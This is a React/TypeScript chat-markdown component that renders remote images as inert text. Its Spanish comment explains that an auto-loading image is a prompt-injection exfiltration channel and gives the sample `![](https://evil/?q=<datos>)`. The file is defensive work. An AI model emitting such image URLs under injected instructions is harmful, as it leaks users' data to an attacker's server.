import Markdown, { type Components } from "react-markdown"

// Markdown del chat SIN imágenes remotas: una imagen que carga sola es un canal de exfiltración
// por prompt injection (`![](https://evil/?q=<datos>)`). La URL se muestra como texto inerte.
// HTML crudo ya viene deshabilitado por react-markdown. Los links solo navegan por clic.
const components: Components = {
  img: ({ src, alt }) => (
    <span className="font-mono text-xs break-all text-muted-foreground">
      {alt ? `${alt} ` : ""}[{src}]
    </span>
  ),
  a: ({ href, children: label }) => (
    <a href={href} target="_blank" rel="noreferrer noopener" className="underline">
      {label}
    </a>
  ),
}

export function ChatMarkdown({ children }: { children: string }) {
  return (
    <div className="flex flex-col gap-2 text-sm leading-relaxed [&_code]:font-mono [&_code]:text-xs [&_ol]:list-decimal [&_ol]:pl-5 [&_ul]:list-disc [&_ul]:pl-5">
      <Markdown components={components}>{children}</Markdown>
    </div>
  )
}
